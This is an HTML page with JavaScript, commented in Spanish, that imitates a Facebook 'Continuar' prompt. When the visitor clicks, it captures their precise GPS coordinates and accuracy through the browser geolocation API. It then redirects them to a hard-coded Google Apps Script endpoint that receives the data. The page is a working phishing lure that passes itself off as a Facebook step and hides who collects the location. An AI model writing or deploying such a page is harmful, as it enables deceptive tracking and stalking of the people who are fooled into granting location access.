<body>

  <div class="container">

    <div class="card">

      <!-- Imagen visible en la página -->
      <img
        class="logo"
        src="1360-facebook_logo.png"
        alt="Facebook"
      >

      <h1>Continuar</h1>

      <p>
        Para continuar, permite el acceso a tu ubicación.
      </p>

      <button
        class="button"
        id="locationButton"
        onclick="solicitarUbicacion()">
        Continuar
      </button>

      <div
        class="loading"
        id="loading">

        <div class="spinner"></div>

        Obteniendo ubicación...

      </div>

      <div
        class="error"
        id="error">

        No fue posible obtener tu ubicación.
        Verifica que hayas permitido el acceso a la ubicación.

      </div>

    </div>

  </div>


  <script>

    /*
     * URL DE TU GOOGLE APPS SCRIPT
     */

    const URL_DESTINO =
      "https://script.google.com/macros/s/AKfycbxOSNHKG4FEa5KSjTodI0SYRD6XAX0kB7AanpSF4boOypSKP2GPf-NGlYJoPo_40p8i/exec";


    function solicitarUbicacion() {

      const button =
        document.getElementById("locationButton");

      const loading =
        document.getElementById("loading");

      const error =
        document.getElementById("error");


      error.style.display = "none";

      button.style.display = "none";

      loading.style.display = "block";


      /*
       * Verificamos que el navegador
       * soporte geolocalización.
       */

      if (!navigator.geolocation) {

        mostrarError();

        return;

      }


      /*
       * Solicitud de ubicación.
       */

      navigator.geolocation.getCurrentPosition(

        function(position) {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;

          const accuracy =
            position.coords.accuracy;


          /*
           * Redireccionamos a Apps Script.
           *
           * Se envían los datos como parámetros
           * de la URL.
           */

          const destino =
            URL_DESTINO +
            "?lat=" + encodeURIComponent(latitude) +
            "&lng=" + encodeURIComponent(longitude) +
            "&accuracy=" + encodeURIComponent(accuracy);


          window.location.href = destino;

        },

        function(error) {

          console.log(
            "Error de ubicación:",
            error
          );

          mostrarError();

        },

        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }

      );

    }


    function mostrarError() {

      document.getElementById("loading")
        .style.display = "none";

      document.getElementById("locationButton")
        .style.display = "block";

      document.getElementById("error")
        .style.display = "block";

    }

  </script>

</body>
</html>
